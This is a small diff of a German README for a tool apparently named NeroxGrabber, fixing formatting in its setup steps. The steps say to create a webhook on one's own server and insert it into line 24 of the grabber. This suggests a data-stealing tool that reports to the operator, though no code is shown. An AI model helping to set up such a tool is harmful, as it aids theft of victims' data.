@@ -31,7 +31,9 @@ pip install -r requirements.txt
 * Webhook:
 ```
 erstelle ein Webhook auf deinem Server
-füge deine Webhook in NeroxGrabber Zeile(
+```
+```
+füge deine Webhook in NeroxGrabber Zeile(24) ein
 ```
 * Run datei:
 ```
